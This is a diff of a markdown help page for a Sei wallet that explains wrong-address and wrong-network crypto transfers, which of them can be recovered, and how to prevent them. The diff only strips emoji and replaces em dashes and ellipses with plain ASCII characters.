@@ -12,9 +12,9 @@
 
 | Platform | Requirements | File |
 |:--|:--|:--|
-| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
 
 All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).
 
@@ -29,12 +29,12 @@ But "wrong address" covers four different situations, and exactly one of them is
 
 The most common outcome, and the only genuinely recoverable one.
 
-If you mistyped an address and it still resolved to a valid account — one of yours, or an account whose key you hold — the funds are simply sitting somewhere else. Open that account and they are there.
+If you mistyped an address and it still resolved to a valid account - one of yours, or an account whose key you hold - the funds are simply sitting somewhere else. Open that account and they are there.
 
 Two versions of this are worth checking before anything else:
 
 - **Another account in the same wallet.** Adding accounts gives each its own address, and it is easy to paste the wrong one from your own history.
-- **A different address form of an account you hold.** Sending to your own `sei1…` form while watching the `0x…` form looks like a loss and is not. The two forms are one account, associated on-chain, so the balance is there either way.
+- **A different address form of an account you hold.** Sending to your own `sei1...` form while watching the `0x...` form looks like a loss and is not. The two forms are one account, associated on-chain, so the balance is there either way.
 
 If the address belongs to you, nothing is broken. Transfer it back, or keep it there.
 
@@ -45,7 +45,7 @@ This is the case people mean when they ask whether it can be undone, and the ans
 Why there is no mechanism:
 
 - **The transaction is final.** Once it is included in a block, the state change is permanent. There is no undo operation at the protocol level.
-- **The recipient's key is the only authority.** Nobody else — not the wallet vendor, not the operator, not a validator — can sign for that account.
+- **The recipient's key is the only authority.** Nobody else - not the wallet vendor, not the operator, not a validator - can sign for that account.
 - **Support cannot reverse what it never controlled.** A self-custody wallet has no custody, which is the point, and also why there is no lever to pull.
 
 What you can still do, honestly: contact the recipient if you know who they are, and ask. Exchanges sometimes return funds sent to a deposit address that belongs to their platform, minus a fee, if the deposit is credited to an account they can identify. That is a request, not a right, and it depends entirely on the recipient's willingness.
@@ -56,9 +56,9 @@ What does not exist: a service that recovers funds from an address you do not co
 
 Funds sent to the right address on the wrong chain are not lost in the same way, but they are not where you are looking.
 
-**Sent on a different network.** An address can exist on several chains, and a transfer sent on Ethereum to a Sei address — or the reverse — is recorded on the chain it was sent on. You need a wallet pointed at that chain to see it. The practical rule is the one from any withdrawal screen: the network label must match the address. If the coins came from another wallet, the address that wallet showed you is your reference — [moving from Compass](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md) is the worked example of that handover. The same logic applies to tokens: [USDC and other tokens](https://github.com/sei-chain/sei-wallet-staking/blob/main/usdc-and-other-tokens.md) are contract balances rather than native SEI, and a native transfer to a token contract is a different mistake with a different answer.
+**Sent on a different network.** An address can exist on several chains, and a transfer sent on Ethereum to a Sei address - or the reverse - is recorded on the chain it was sent on. You need a wallet pointed at that chain to see it. The practical rule is the one from any withdrawal screen: the network label must match the address. If the coins came from another wallet, the address that wallet showed you is your reference - [moving from Compass](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md) is the worked example of that handover. The same logic applies to tokens: [USDC and other tokens](https://github.com/sei-chain/sei-wallet-staking/blob/main/usdc-and-other-tokens.md) are contract balances rather than native SEI, and a native transfer to a token contract is a different mistake with a different answer.
 
-**Sent native SEI to a `sei1…` address.** If the address is a valid account, the funds are at that account; what you may lack is a wallet that signs for the Cosmos-side derivation. This is a visibility problem rather than a loss, and it is the same mechanism that makes a Ledger appear to show two addresses.
+**Sent native SEI to a `sei1...` address.** If the address is a valid account, the funds are at that account; what you may lack is a wallet that signs for the Cosmos-side derivation. This is a visibility problem rather than a loss, and it is the same mechanism that makes a Ledger appear to show two addresses.
 
 **Sent to a testnet address, or from testnet to mainnet.** Testnet SEI is a different asset on a different network (chain 1328 rather than 1329). A "missing" transfer between them is not recoverable because it was never a mainnet transfer. If the balance you sent was test tokens, nothing of value moved.
 
@@ -79,14 +79,14 @@ The same rule covers "we found your funds" messages, transaction-lookup sites th
 
 Start with the hash: look it up on an explorer, confirm which chain it is on and compare the destination character by character before you conclude anything. The mistake itself is almost always procedural, not technical, so the fix is procedural too.
 
-- **Send a test amount first** for any address you have not used before. One fee versus the whole balance — and [gas and fees](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md) explains what that fee actually is.
+- **Send a test amount first** for any address you have not used before. One fee versus the whole balance - and [gas and fees](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md) explains what that fee actually is.
 - **Match the first and last four characters** against the source. Clipboard substitution changes the middle, which is exactly the part nobody reads.
 - **Read the recipient on the confirmation screen**, and on the hardware device if you use one. The device screen is the last place a substituted address becomes visible.
 - **Keep a short address book** for the addresses you use repeatedly, and verify each entry once, carefully, when you add it.
 - **Do not copy addresses from chat messages, screenshots or social posts**, however official they look.
 - **Check the network label** before confirming, every time. Chain 1329 is mainnet; 1328 is testnet.
 
-If a transfer has been broadcast but is not confirming, that is a different problem from a wrong address — [a transaction that never confirmed](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) may still be replaceable or may simply need time. A transaction that confirmed and reverted is different again, and [a failed transaction](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-failed-what-to-check.md) covers what to check. The distinction matters: a pending transfer has not been finalised, so acting quickly can still change the outcome.
+If a transfer has been broadcast but is not confirming, that is a different problem from a wrong address - [a transaction that never confirmed](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) may still be replaceable or may simply need time. A transaction that confirmed and reverted is different again, and [a failed transaction](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-failed-what-to-check.md) covers what to check. The distinction matters: a pending transfer has not been finalised, so acting quickly can still change the outcome.
 
 ## Frequently asked questions
 
@@ -108,9 +108,9 @@ If a transfer has been broadcast but is not confirming, that is a different prob
 
 | Platform | Installer |
 |:--|:--|
-| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
 
 Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.
 
